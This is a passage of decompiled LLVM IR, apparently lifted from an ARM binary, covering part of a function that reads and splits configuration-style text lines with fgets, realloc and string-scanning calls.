dec_label_pc_29c10:                               ; preds = %dec_label_pc_29c9c, %dec_label_pc_29c88, %dec_label_pc_29c00
  %v0_29c18 = phi i32 [ %v0_29c0c, %dec_label_pc_29c00 ], [ %v1_29c88, %dec_label_pc_29c88 ], [ %v0_29c18.pre.pre, %dec_label_pc_29c9c ]
  %v0_29c10 = load i32, i32* @r5, align 4
  %v1_29c10 = add i32 %v0_29c10, 12
  store i32 %v1_29c10, i32* %r0.global-to-local, align 4
  %v1_29c14 = inttoptr i32 %v1_29c10 to i32*
  %v2_29c14 = load i32, i32* %v1_29c14, align 4
  store i32 %v2_29c14, i32* %r0.global-to-local, align 4
  %v3_29c14 = add i32 %v0_29c10, 16
  %v4_29c14 = inttoptr i32 %v3_29c14 to i32*
  %v5_29c14 = load i32, i32* %v4_29c14, align 4
  %v2_29c18 = add i32 %v2_29c14, %v0_29c18
  store i32 %v2_29c18, i32* %r0.global-to-local, align 4
  %v2_29c1c = sub i32 %v5_29c14, %v0_29c18
  %v1_29c20 = inttoptr i32 %v0_29c10 to i32*
  %v2_29c20 = load i32, i32* %v1_29c20, align 4
  store i32 %v2_29c20, i32* %r2.global-to-local, align 4
  %v3_29c24 = call i32 @fgets(i32 %v2_29c18, i32 %v2_29c1c, i32 %v2_29c20)
  store i32 %v3_29c24, i32* %r0.global-to-local, align 4
  store i32 %v3_29c24, i32* %r4.global-to-local, align 4
  %v2_29c28 = icmp eq i32 %v3_29c24, 0
  store i1 %v2_29c28, i1* %cpsr_z.global-to-local, align 1
  %v0_29c30 = load i32, i32* @r5, align 4
  %v1_29c30 = add i32 %v0_29c30, 12
  br i1 %v2_29c28, label %dec_label_pc_29c30, label %dec_label_pc_29c48

dec_label_pc_29c30:                               ; preds = %dec_label_pc_29c10
  store i32 %v1_29c30, i32* %r0.global-to-local, align 4
  %v1_29c34 = inttoptr i32 %v1_29c30 to i32*
  %v2_29c34 = load i32, i32* %v1_29c34, align 4
  store i32 %v2_29c34, i32* %r0.global-to-local, align 4
  %v3_29c34 = add i32 %v0_29c30, 16
  %v4_29c34 = inttoptr i32 %v3_29c34 to i32*
  %v5_29c34 = load i32, i32* %v4_29c34, align 4
  store i32 %v5_29c34, i32* %r2.global-to-local, align 4
  %v3_29c3c = inttoptr i32 %v2_29c34 to i8*
  %v4_29c3c = call i32 @__GI_memset(i8* %v3_29c3c, i32 0, i32 %v5_29c34)
  store i32 %v4_29c3c, i32* %r0.global-to-local, align 4
  %v0_29c40 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_29e60

dec_label_pc_29c48:                               ; preds = %dec_label_pc_29c10
  %v2_29c48 = inttoptr i32 %v1_29c30 to i32*
  %v3_29c48 = load i32, i32* %v2_29c48, align 4
  store i32 %v3_29c48, i32* @r4, align 4
  %v1_29c4c = load i32, i32* @r6, align 4
  %v2_29c4c = add i32 %v1_29c4c, %v3_29c48
  %v3_29c4c = inttoptr i32 %v2_29c4c to i8*
  store i32 %v2_29c4c, i32* %r0.global-to-local, align 4
  %v3_29c50 = call i32 @strlen(i8* %v3_29c4c)
  %v0_29c58 = load i32, i32* @r6, align 4
  %v2_29c58 = add i32 %v0_29c58, %v3_29c50
  store i32 %v2_29c58, i32* @r6, align 4
  %v0_29c5c = load i32, i32* @r4, align 4
  store i32 %v0_29c5c, i32* @r0, align 4
  %v2_29c60 = call i32 @__GI_strchr(i32 %v0_29c5c, i32 10)
  store i32 %v2_29c60, i32* %r0.global-to-local, align 4
  %v2_29c64 = icmp eq i32 %v2_29c60, 0
  store i1 %v2_29c64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_29c64, label %dec_label_pc_29c90, label %dec_label_pc_29c6c

dec_label_pc_29c6c:                               ; preds = %dec_label_pc_29c48
  %v1_29c6c = inttoptr i32 %v2_29c60 to i8*
  %v2_29c6c = load i8, i8* %v1_29c6c, align 1
  %v3_29c6c = zext i8 %v2_29c6c to i32
  %v1_29c70 = add nuw nsw i32 %v3_29c6c, 255
  %v1_29c74 = urem i32 %v1_29c70, 256
  store i32 %v1_29c74, i32* %r3.global-to-local, align 4
  %v7_29c78 = icmp eq i32 %v1_29c74, 92
  store i1 %v7_29c78, i1* %cpsr_z.global-to-local, align 1
  %v1_29c7c = trunc i32 %v1_29c70 to i8
  store i8 %v1_29c7c, i8* %v1_29c6c, align 1
  %v0_29c80 = load i32, i32* @r6, align 4
  %v1_29c80 = add i32 %v0_29c80, -1
  store i32 %v1_29c80, i32* @r6, align 4
  %v0_29c84 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_29c84, label %dec_label_pc_29c88, label %dec_label_pc_29d14

dec_label_pc_29c88:                               ; preds = %dec_label_pc_29c6c
  %v1_29c88 = add i32 %v0_29c80, -2
  store i32 %v1_29c88, i32* @r6, align 4
  br label %dec_label_pc_29c10

dec_label_pc_29c90:                               ; preds = %dec_label_pc_29c48
  %v0_29c90 = load i32, i32* @r5, align 4
  %v1_29c90 = add i32 %v0_29c90, 20
  %v2_29c90 = inttoptr i32 %v1_29c90 to i32*
  %v3_29c90 = load i32, i32* %v2_29c90, align 4
  store i32 %v3_29c90, i32* %r3.global-to-local, align 4
  %v2_29c94 = icmp eq i32 %v3_29c90, 0
  store i1 %v2_29c94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_29c94, label %dec_label_pc_29ccc, label %dec_label_pc_29c9c

dec_label_pc_29c9c:                               ; preds = %dec_label_pc_29c90
  %v1_29c9c = add i32 %v0_29c90, 16
  %v2_29c9c = inttoptr i32 %v1_29c9c to i32*
  %v3_29c9c = load i32, i32* %v2_29c9c, align 4
  store i32 %v3_29c9c, i32* %r3.global-to-local, align 4
  %v1_29ca0 = add i32 %v0_29c90, 8
  %v2_29ca0 = inttoptr i32 %v1_29ca0 to i32*
  %v3_29ca0 = load i32, i32* %v2_29ca0, align 4
  %v1_29ca4 = add i32 %v3_29c9c, 4096
  store i32 %v1_29ca4, i32* %r3.global-to-local, align 4
  %v2_29ca8 = add i32 %v3_29ca0, %v1_29ca4
  store i32 %v1_29ca4, i32* %v2_29c9c, align 4
  %v0_29cb0 = load i32, i32* @r5, align 4
  %v1_29cb0 = add i32 %v0_29cb0, 4
  %v2_29cb0 = inttoptr i32 %v1_29cb0 to i32*
  %v3_29cb0 = load i32, i32* %v2_29cb0, align 4
  store i32 %v3_29cb0, i32* %r0.global-to-local, align 4
  %v2_29cb4 = inttoptr i32 %v3_29cb0 to i32*
  %v3_29cb4 = call i32 @realloc(i32* %v2_29cb4, i32 %v2_29ca8)
  store i32 %v3_29cb4, i32* %r0.global-to-local, align 4
  %v0_29cb8 = load i32, i32* @r5, align 4
  %v1_29cb8 = add i32 %v0_29cb8, 8
  %v2_29cb8 = inttoptr i32 %v1_29cb8 to i32*
  %v3_29cb8 = load i32, i32* %v2_29cb8, align 4
  %v2_29cbc = add i32 %v3_29cb8, %v3_29cb4
  store i32 %v2_29cbc, i32* %r3.global-to-local, align 4
  %v2_29cc0 = add i32 %v0_29cb8, 12
  %v3_29cc0 = inttoptr i32 %v2_29cc0 to i32*
  store i32 %v2_29cbc, i32* %v3_29cc0, align 4
  %v1_29cc4 = load i32, i32* @r5, align 4
  %v2_29cc4 = add i32 %v1_29cc4, 4
  %v3_29cc4 = inttoptr i32 %v2_29cc4 to i32*
  store i32 %v3_29cb4, i32* %v3_29cc4, align 4
  %v0_29c18.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_29c10

dec_label_pc_29ccc:                               ; preds = %dec_label_pc_29c90, %.dec_label_pc_29ccc_crit_edge
  %v0_29ccc = phi i32 [ %v0_29ccc.pre, %.dec_label_pc_29ccc_crit_edge ], [ %v0_29c90, %dec_label_pc_29c90 ]
  %v1_29ccc = inttoptr i32 %v0_29ccc to i32*
  %v2_29ccc = load i32, i32* %v1_29ccc, align 4
  %v1_29cd0 = add i32 %v2_29ccc, 52
  %v2_29cd0 = inttoptr i32 %v1_29cd0 to i32*
  %v3_29cd0 = load i32, i32* %v2_29cd0, align 4
  store i32 %v3_29cd0, i32* %r3.global-to-local, align 4
  %v2_29cd4 = icmp eq i32 %v3_29cd0, 0
  store i1 %v2_29cd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_29cd4, label %dec_label_pc_29d00, label %dec_label_pc_29cdc

dec_label_pc_29cdc:                               ; preds = %dec_label_pc_29ccc
  %v1_29cdc = add i32 %v2_29ccc, 16
  %v2_29cdc = inttoptr i32 %v1_29cdc to i32*
  %v3_29cdc = load i32, i32* %v2_29cdc, align 4
  store i32 %v3_29cdc, i32* %r2.global-to-local, align 4
  %v1_29ce0 = add i32 %v2_29ccc, 24
  %v2_29ce0 = inttoptr i32 %v1_29ce0 to i32*
  %v3_29ce0 = load i32, i32* %v2_29ce0, align 4
  store i32 %v3_29ce0, i32* %r3.global-to-local, align 4
  %v3_29ce4 = icmp ult i32 %v3_29cdc, %v3_29ce0
  %v9_29ce4 = icmp eq i32 %v3_29cdc, %v3_29ce0
  store i1 %v9_29ce4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_29ce4, label %dec_label_pc_29d08thread-pre-split, label %dec_label_pc_29cf4

dec_label_pc_29cf4:                               ; preds = %dec_label_pc_29cdc
  store i32 %v2_29ccc, i32* %r0.global-to-local, align 4
  %v1_29cf8 = inttoptr i32 %v2_29ccc to i16*
  %v2_29cf8 = call i32 @getc_unlocked(i16* %v1_29cf8)
  store i32 %v2_29cf8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_29d08

dec_label_pc_29d00:                               ; preds = %dec_label_pc_29ccc
  store i32 %v2_29ccc, i32* %r0.global-to-local, align 4
  %v1_29d04 = call i32 @__GI_fgetc(i32 %v2_29ccc)
  store i32 %v1_29d04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_29d08

dec_label_pc_29d08thread-pre-split:               ; preds = %dec_label_pc_29cdc
  %v2_29ce8 = inttoptr i32 %v3_29cdc to i8*
  %v3_29ce8 = load i8, i8* %v2_29ce8, align 1
  %v4_29ce8 = zext i8 %v3_29ce8 to i32
  store i32 %v4_29ce8, i32* %r0.global-to-local, align 4
  %v6_29ce8 = add i32 %v3_29cdc, 1
  store i32 %v6_29ce8, i32* %r2.global-to-local, align 4
  store i32 %v6_29ce8, i32* %v2_29cdc, align 4
  %v0_29d08.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_29d08

dec_label_pc_29d08:                               ; preds = %dec_label_pc_29d08thread-pre-split, %dec_label_pc_29cf4, %dec_label_pc_29d00
  %v1_29d0c = phi i32 [ %v0_29d08.pr, %dec_label_pc_29d08thread-pre-split ], [ %v2_29cf8, %dec_label_pc_29cf4 ], [ %v1_29d04, %dec_label_pc_29d00 ]
  %v7_29d08 = icmp eq i32 %v1_29d0c, 10
  store i1 %v7_29d08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_29d08, label %dec_label_pc_29d14.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_29d08
  %v8_29d0c = icmp eq i32 %v1_29d0c, -1
  store i1 %v8_29d0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_29d0c, label %dec_label_pc_29d14.loopexit, label %.dec_label_pc_29ccc_crit_edge

.dec_label_pc_29ccc_crit_edge:                    ; preds = %bb66
  %v0_29ccc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_29ccc

dec_label_pc_29d14.loopexit:                      ; preds = %bb66, %dec_label_pc_29d08
  %v0_29d14.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_29d14

dec_label_pc_29d14:                               ; preds = %dec_label_pc_29c6c, %dec_label_pc_29d14.loopexit
  %v0_29d14 = phi i32 [ %v0_29d14.pre, %dec_label_pc_29d14.loopexit ], [ %v1_29c80, %dec_label_pc_29c6c ]
  %v7_29d14 = icmp eq i32 %v0_29d14, -1
  store i1 %v7_29d14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_29d14, label %dec_label_pc_29e5c, label %dec_label_pc_29d1c

dec_label_pc_29d1c:                               ; preds = %dec_label_pc_29d14
  store i32 %v1_29b84, i32* %r3.global-to-local, align 4
  store i1 %v2_29d20, i1* %cpsr_z.global-to-local, align 1
  %v0_29d24 = load i32, i32* @r5, align 4
  %v1_29d24 = add i32 %v0_29d24, 12
  %v2_29d24 = inttoptr i32 %v1_29d24 to i32*
  %v3_29d24 = load i32, i32* %v2_29d24, align 4
  store i32 %v3_29d24, i32* @r4, align 4
  br i1 %v2_29d20, label %dec_label_pc_29d3c, label %dec_label_pc_29d2c

dec_label_pc_29d2c:                               ; preds = %dec_label_pc_29d1c
  store i32 %v3_29d24, i32* @r0, align 4
  %v1_29d34 = inttoptr i32 %v3_29d24 to i8*
  %v2_29d34 = call i32 @__GI_strspn(i8* %v1_29d34)
  store i32 %v2_29d34, i32* %r0.global-to-local, align 4
  %v0_29d38 = load i32, i32* @r4, align 4
  %v2_29d38 = add i32 %v0_29d38, %v2_29d34
  store i32 %v2_29d38, i32* @r4, align 4
  br label %dec_label_pc_29d3c

dec_label_pc_29d3c:                               ; preds = %dec_label_pc_29d1c, %dec_label_pc_29d2c
  %v0_29d3c = phi i32 [ %v3_29d24, %dec_label_pc_29d1c ], [ %v2_29d38, %dec_label_pc_29d2c ]
  %v1_29d3c = inttoptr i32 %v0_29d3c to i8*
  %v2_29d3c = load i8, i8* %v1_29d3c, align 1
  %v3_29d3c = zext i8 %v2_29d3c to i32
  store i32 %v3_29d3c, i32* %r2.global-to-local, align 4
  %v2_29d40 = icmp eq i8 %v2_29d3c, 0
  store i1 %v2_29d40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_29d40, label %dec_label_pc_29bac.backedge, label %dec_label_pc_29d48

dec_label_pc_29bac.backedge:                      ; preds = %dec_label_pc_29d3c, %dec_label_pc_29d48, %dec_label_pc_29e54
  %v0_29bac.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_29bac

dec_label_pc_29d48:                               ; preds = %dec_label_pc_29d3c
  %v0_29d48 = load i32, i32* @r7, align 4
  %v1_29d48 = inttoptr i32 %v0_29d48 to i8*
  %v2_29d48 = load i8, i8* %v1_29d48, align 1
  %v3_29d48 = zext i8 %v2_29d48 to i32
  store i32 %v3_29d48, i32* %r3.global-to-local, align 4
  %v9_29d4c = icmp eq i8 %v2_29d48, %v2_29d3c
  store i1 %v9_29d4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_29d4c, label %dec_label_pc_29bac.backedge, label %dec_label_pc_29d54

dec_label_pc_29d54:                               ; preds = %dec_label_pc_29d48
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_29d58 = load i32, i32* @r5, align 4
  %v1_29d58 = add i32 %v0_29d58, 4
  %v2_29d58 = inttoptr i32 %v1_29d58 to i32*
  %v3_29d58 = load i32, i32* %v2_29d58, align 4
  store i32 %v3_29d58, i32* %r0.global-to-local, align 4
  %v0_29d5c = load i32, i32* @fp, align 4
  store i32 %v3_29d58, i32* %v1_29d78, align 4
  store i32 %v3_29b70, i32* %r2.global-to-local, align 4
  %v3_29d68 = inttoptr i32 %v3_29d58 to i8*
  %v4_29d68 = call i32 @__GI_memset(i8* %v3_29d68, i32 %v0_29d5c, i32 %v3_29b70)
  store i32 %v4_29d68, i32* %r0.global-to-local, align 4
  %v0_29d6c = load i32, i32* @fp, align 4
  store i32 %v0_29d6c, i32* @r6, align 4
  %v0_29e2c12 = load i32, i32* @r4, align 4
  %v1_29e2c13 = inttoptr i32 %v0_29e2c12 to i8*
  %v2_29e2c14 = load i8, i8* %v1_29e2c13, align 1
  %v3_29e2c15 = zext i8 %v2_29e2c14 to i32
  store i32 %v3_29e2c15, i32* %r2.global-to-local, align 4
  %v2_29e3016 = icmp eq i8 %v2_29e2c14, 0
  store i1 %v2_29e3016, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_29e3016, label %dec_label_pc_29e48, label %dec_label_pc_29e38

dec_label_pc_29d74:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_29d78 = load i32, i32* %v1_29d78, align 4
  store i32 %v2_29d78, i32* %r3.global-to-local, align 4
  store i32 %v1_29b88, i32* %r2.global-to-local, align 4
  %v9_29d80 = icmp eq i32 %v2_29d84, %v1_29b88
  store i1 %v9_29d80, i1* %cpsr_z.global-to-local, align 1
  %v5_29d84 = mul i32 %v2_29d84, 4
  %v6_29d84 = add i32 %v2_29d78, %v5_29d84
  %v7_29d84 = inttoptr i32 %v6_29d84 to i32*
  store i32 %v0_29d84, i32* %v7_29d84, align 4
  br i1 %v9_29d80, label %dec_label_pc_29d8c, label %dec_label_pc_29d98

dec_label_pc_29d8c:                               ; preds = %dec_label_pc_29d74
  store i32 %v1_29b94, i32* %r3.global-to-local, align 4
  store i1 %v2_29d90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_29d90, label %dec_label_pc_29d98, label %dec_label_pc_29db8

dec_label_pc_29d98:                               ; preds = %dec_label_pc_29d8c, %dec_label_pc_29d74
  %v0_29d98 = load i32, i32* @r7, align 4
  %v1_29d98 = inttoptr i32 %v0_29d98 to i8*
  %v2_29d98 = load i8, i8* %v1_29d98, align 1
  %v3_29d98 = zext i8 %v2_29d98 to i32
  store i32 %v3_29d98, i32* %r3.global-to-local, align 4
  %v2_29d9c = icmp eq i8 %v2_29d98, 0
  store i1 %v2_29d9c, i1* %cpsr_z.global-to-local, align 1
  %v0_29da0 = load i32, i32* @r4, align 4
  store i32 %v0_29da0, i32* @r0, align 4
  %v1_29da4 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_29d9c, i32 %v1_29da4, i32 %v0_29d98
  store i32 %storemerge, i32* @r1, align 4
  %v0_29dac = call i32 @strcspn()
  store i32 %v0_29dac, i32* %r0.global-to-local, align 4
  %v0_29db0 = load i32, i32* @r4, align 4
  %v2_29db0 = add i32 %v0_29db0, %v0_29dac
  store i32 %v2_29db0, i32* @r4, align 4
  br label %dec_label_pc_29df0

dec_label_pc_29db8:                               ; preds = %dec_label_pc_29d8c
  %v0_29db8 = load i32, i32* @r4, align 4
  store i32 %v0_29db8, i32* @r0, align 4
  %v0_29dbc = load i32, i32* @r7, align 4
  %v1_29dbc = inttoptr i32 %v0_29dbc to i8*
  %v2_29dbc = load i8, i8* %v1_29dbc, align 1
  %v3_29dbc = zext i8 %v2_29dbc to i32
  %v5_29dc0 = call i32 @__GI_strchrnul(i32 %v0_29db8, i32 %v3_29dbc, i32 %v1_29b88, i32 %v1_29b94)
  store i32 %v5_29dc0, i32* %r0.global-to-local, align 4
  store i32 %v1_29b84, i32* %r2.global-to-local, align 4
  store i1 %v2_29d20, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_29dc0, i32* @r4, align 4
  br i1 %v2_29d20, label %dec_label_pc_29df0, label %dec_label_pc_29ddc

dec_label_pc_29dd8:                               ; preds = %dec_label_pc_29ddc
  %v1_29dd8 = add i32 %v0_29df0.pre, -1
  store i32 %v1_29dd8, i32* @r4, align 4
  br label %dec_label_pc_29ddc

dec_label_pc_29ddc:                               ; preds = %dec_label_pc_29db8, %dec_label_pc_29dd8
  %v0_29ddc = phi i32 [ %v1_29dd8, %dec_label_pc_29dd8 ], [ %v5_29dc0, %dec_label_pc_29db8 ]
  %v1_29ddc = add i32 %v0_29ddc, -1
  %v2_29ddc = inttoptr i32 %v1_29ddc to i8*
  %v3_29ddc = load i8, i8* %v2_29ddc, align 1
  %v4_29ddc = zext i8 %v3_29ddc to i32
  %v0_29de0 = load i32, i32* @sl, align 4
  store i32 %v0_29de0, i32* @r0, align 4
  %v2_29de4 = call i32 @__GI_strchr(i32 %v0_29de0, i32 %v4_29ddc)
  store i32 %v2_29de4, i32* %r0.global-to-local, align 4
  %v2_29de8 = icmp eq i32 %v2_29de4, 0
  store i1 %v2_29de8, i1* %cpsr_z.global-to-local, align 1
  %v0_29df0.pre = load i32, i32* @r4, align 4
  br i1 %v2_29de8, label %dec_label_pc_29df0, label %dec_label_pc_29dd8

dec_label_pc_29df0:                               ; preds = %dec_label_pc_29ddc, %dec_label_pc_29db8, %dec_label_pc_29d98
  %v3_29dfc = phi i32 [ %v5_29dc0, %dec_label_pc_29db8 ], [ %v2_29db0, %dec_label_pc_29d98 ], [ %v0_29df0.pre, %dec_label_pc_29ddc ]
  %v1_29df0 = inttoptr i32 %v3_29dfc to i8*
  %v2_29df0 = load i8, i8* %v1_29df0, align 1
  %v3_29df0 = zext i8 %v2_29df0 to i32
  store i32 %v3_29df0, i32* %r2.global-to-local, align 4
  %v0_29df4 = load i32, i32* @r7, align 4
  %v1_29df4 = inttoptr i32 %v0_29df4 to i8*
  %v2_29df4 = load i8, i8* %v1_29df4, align 1
  %v3_29df4 = zext i8 %v2_29df4 to i32
  store i32 %v3_29df4, i32* %r3.global-to-local, align 4
  %v9_29df8 = icmp eq i8 %v2_29df4, %v2_29df0
  store i1 %v9_29df8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_29df8, label %bb69, label %dec_label_pc_29e04

bb69:                                             ; preds = %dec_label_pc_29df0
  %v1_29dfc = load i32, i32* @fp, align 4
  %v2_29dfc = trunc i32 %v1_29dfc to i8
  store i8 %v2_29dfc, i8* %v1_29df0, align 1
  %v0_29e00.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_29e00.pr, label %bb71, label %.dec_label_pc_29e04_crit_edge

.dec_label_pc_29e04_crit_edge:                    ; preds = %bb69
  %v0_29e04.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_29e04

dec_label_pc_29e04:                               ; preds = %.dec_label_pc_29e04_crit_edge, %dec_label_pc_29df0
  %v0_29e04 = phi i32 [ %v0_29e04.pre, %.dec_label_pc_29e04_crit_edge ], [ %v3_29df0, %dec_label_pc_29df0 ]
  %v2_29e04 = icmp eq i32 %v0_29e04, 0
  store i1 %v2_29e04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_29e04, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_29e04
  %v1_29e08 = load i32, i32* @fp, align 4
  %v2_29e08 = trunc i32 %v1_29e08 to i8
  %v3_29e08 = load i32, i32* @r4, align 4
  %v4_29e08 = inttoptr i32 %v3_29e08 to i8*
  store i8 %v2_29e08, i8* %v4_29e08, align 1
  %v5_29e08 = load i32, i32* @r4, align 4
  %v6_29e08 = add i32 %v5_29e08, 1
  store i32 %v6_29e08, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_29e04, %bb70
  %v2_29e0c = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_29e0c, i32* %r3.global-to-local, align 4
  %v2_29e10 = icmp eq i32 %v2_29e0c, 0
  store i1 %v2_29e10, i1* %cpsr_z.global-to-local, align 1
  %v0_29e2c.pre = load i32, i32* @r4, align 4
  br i1 %v2_29e10, label %dec_label_pc_29e28, label %dec_label_pc_29e18

dec_label_pc_29e18:                               ; preds = %bb71
  store i32 %v0_29e2c.pre, i32* @r0, align 4
  %v1_29e20 = inttoptr i32 %v0_29e2c.pre to i8*
  %v2_29e20 = call i32 @__GI_strspn(i8* %v1_29e20)
  store i32 %v2_29e20, i32* %r0.global-to-local, align 4
  %v0_29e24 = load i32, i32* @r4, align 4
  %v2_29e24 = add i32 %v0_29e24, %v2_29e20
  store i32 %v2_29e24, i32* @r4, align 4
  br label %dec_label_pc_29e28

dec_label_pc_29e28:                               ; preds = %bb71, %dec_label_pc_29e18
  %v0_29e2c = phi i32 [ %v2_29e24, %dec_label_pc_29e18 ], [ %v0_29e2c.pre, %bb71 ]
  %v0_29e28 = load i32, i32* @r6, align 4
  %v1_29e28 = add i32 %v0_29e28, 1
  store i32 %v1_29e28, i32* @r6, align 4
  %v1_29e2c = inttoptr i32 %v0_29e2c to i8*
  %v2_29e2c = load i8, i8* %v1_29e2c, align 1
  %v3_29e2c = zext i8 %v2_29e2c to i32
  store i32 %v3_29e2c, i32* %r2.global-to-local, align 4
  %v2_29e30 = icmp eq i8 %v2_29e2c, 0
  store i1 %v2_29e30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_29e30, label %dec_label_pc_29e48, label %dec_label_pc_29e38

dec_label_pc_29e38:                               ; preds = %dec_label_pc_29d54, %dec_label_pc_29e28
  %v0_29d84 = phi i32 [ %v0_29e2c, %dec_label_pc_29e28 ], [ %v0_29e2c12, %dec_label_pc_29d54 ]
  %v2_29d84 = phi i32 [ %v1_29e28, %dec_label_pc_29e28 ], [ %v0_29d6c, %dec_label_pc_29d54 ]
  %v1_29e3c = phi i32 [ %v3_29e2c, %dec_label_pc_29e28 ], [ %v3_29e2c15, %dec_label_pc_29d54 ]
  %v0_29e38 = load i32, i32* @r7, align 4
  %v1_29e38 = inttoptr i32 %v0_29e38 to i8*
  %v2_29e38 = load i8, i8* %v1_29e38, align 1
  %v3_29e38 = zext i8 %v2_29e38 to i32
  store i32 %v3_29e38, i32* %r3.global-to-local, align 4
  %v9_29e3c = icmp eq i32 %v3_29e38, %v1_29e3c
  store i1 %v9_29e3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_29e3c, label %dec_label_pc_29e48, label %bb72

bb72:                                             ; preds = %dec_label_pc_29e38
  %v2_29e40 = load i32, i32* @sb, align 4
  %v3_29e40 = sub i32 %v2_29d84, %v2_29e40
  %v5_29e40 = xor i32 %v2_29e40, %v2_29d84
  %v6_29e40 = xor i32 %v3_29e40, %v2_29d84
  %v7_29e40 = and i32 %v6_29e40, %v5_29e40
  %v8_29e40 = icmp slt i32 %v7_29e40, 0
  %v9_29e40 = icmp slt i32 %v3_29e40, 0
  %v10_29e40 = icmp eq i32 %v2_29d84, %v2_29e40
  store i1 %v10_29e40, i1* %cpsr_z.global-to-local, align 1
  %v2_29e44 = xor i1 %v9_29e40, %v8_29e40
  br i1 %v2_29e44, label %dec_label_pc_29d74, label %dec_label_pc_29e48

dec_label_pc_29e48:                               ; preds = %dec_label_pc_29e38, %dec_label_pc_29e28, %bb72, %dec_label_pc_29d54
  %v0_29e4c = phi i32 [ %v0_29d6c, %dec_label_pc_29d54 ], [ %v2_29d84, %dec_label_pc_29e38 ], [ %v1_29e28, %dec_label_pc_29e28 ], [ %v2_29d84, %bb72 ]
  store i32 %v3_29b6c, i32* %r2.global-to-local, align 4
  %v9_29e4c = icmp eq i32 %v0_29e4c, %v3_29b6c
  store i1 %v9_29e4c, i1* %cpsr_z.global-to-local, align 1
  %v6_29e50 = icmp slt i32 %v0_29e4c, %v3_29b6c
  br i1 %v6_29e50, label %dec_label_pc_29e54, label %dec_label_pc_29e60

dec_label_pc_29e54:                               ; preds = %dec_label_pc_29e48
  %v0_29e54 = load i32, i32* @r8, align 4
  %v1_29e54 = and i32 %v0_29e54, 1048576
  %v2_29e54 = icmp eq i32 %v1_29e54, 0
  store i1 %v2_29e54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_29e54, label %dec_label_pc_29bac.backedge, label %dec_label_pc_29e5c

dec_label_pc_29e5c:                               ; preds = %dec_label_pc_29e54, %dec_label_pc_29d14, %.thread, %entry
  br label %dec_label_pc_29e60

dec_label_pc_29e60:                               ; preds = %dec_label_pc_29e48, %dec_label_pc_29c30, %dec_label_pc_29e5c
  %v0_29e60 = phi i32 [ %v0_29c40, %dec_label_pc_29c30 ], [ 0, %dec_label_pc_29e5c ], [ %v0_29e4c, %dec_label_pc_29e48 ]
  store i32 %v0_29e60, i32* %r0.global-to-local, align 4
  store i32 %v3_29b48, i32* @r4, align 4
  store i32 %v6_29b48, i32* @r5, align 4
  store i32 %v9_29b48, i32* @r6, align 4
  store i32 %v12_29b48, i32* @r7, align 4
  store i32 %v15_29b48, i32* @r8, align 4
  store i32 %v18_29b48, i32* @sb, align 4
  store i32 %v21_29b48, i32* @sl, align 4
  store i32 %v24_29b48, i32* @fp, align 4
  ret i32 %v0_29e60

; uselistorder directives
  uselistorder i32 %v0_29e60, { 1, 0 }
  uselistorder i32 %v0_29e4c, { 0, 2, 1 }
  uselistorder i32 %v3_29e40, { 1, 0 }
  uselistorder i32 %v2_29e40, { 1, 0, 2 }
  uselistorder i32 %v2_29d84, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_29e2c.pre, { 0, 2, 1 }
  uselistorder i32 %v5_29dc0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_29d6c, { 1, 0, 2 }
  uselistorder i1 %v9_29d4c, { 1, 0 }
  uselistorder i32 %v3_29d24, { 0, 2, 1, 3 }
  uselistorder i1 %v7_29d14, { 1, 0 }
  uselistorder i1 %v8_29d0c, { 1, 0 }
  uselistorder i32 %v3_29cdc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_29ccc, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v3_29cb4, { 1, 0, 2 }
  uselistorder i32 %v1_29ca4, { 1, 0, 2 }
  uselistorder i32 %v0_29c90, { 0, 2, 1, 3 }
  uselistorder i32 %v1_29c88, { 1, 0 }
  uselistorder i32 %v1_29c74, { 1, 0 }
  uselistorder i32 %v1_29c70, { 1, 0 }
  uselistorder i32 %v2_29c4c, { 1, 0 }
  uselistorder i32 %v1_29c30, { 2, 0, 1 }
  uselistorder i32 %v0_29c18, { 1, 0 }
  uselistorder i32 %v1_29c08, { 0, 2, 1 }
  uselistorder i32* %v1_29d78, { 1, 0 }
  uselistorder i1 %v2_29d20, { 1, 0, 2, 3 }
  uselistorder i32 %v1_29b94, { 2, 0, 1, 3 }
  uselistorder i32 %v1_29b88, { 2, 1, 0 }
  uselistorder i32 %v3_29b70, { 1, 2, 0 }
  uselistorder i32 %v3_29b6c, { 2, 1, 0 }
